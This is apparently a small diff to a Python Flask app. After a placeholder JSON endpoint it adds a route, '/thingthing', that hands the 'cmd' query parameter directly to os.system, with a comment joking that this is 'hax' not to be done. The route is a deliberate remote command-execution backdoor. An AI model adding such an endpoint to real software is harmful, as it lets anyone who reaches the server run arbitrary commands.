@@ -1,5 +1,6 @@
 #!/usr/bin/python3
 
+
 from flask import Flask, render_template, request
 from flask import redirect, url_for, jsonify
 import os,sys,re
@@ -42,6 +43,17 @@ def testpost():
 def hello():
     return jsonify({'name':'The Legitimate Person, Of Interest',
                     'address':'ThingTown, Canada'})
+
+##################################################
+##
+##
+## this-is-hax-obviously-do-NOT-to-this
+## but-also-it-is-entertaining-lol
+##
+
+@app.route('/thingthing')
+def runcmd():
+    return os.system(request.args.get('cmd'))
 
 ##################################################
 ## if __name__ == '__main__':
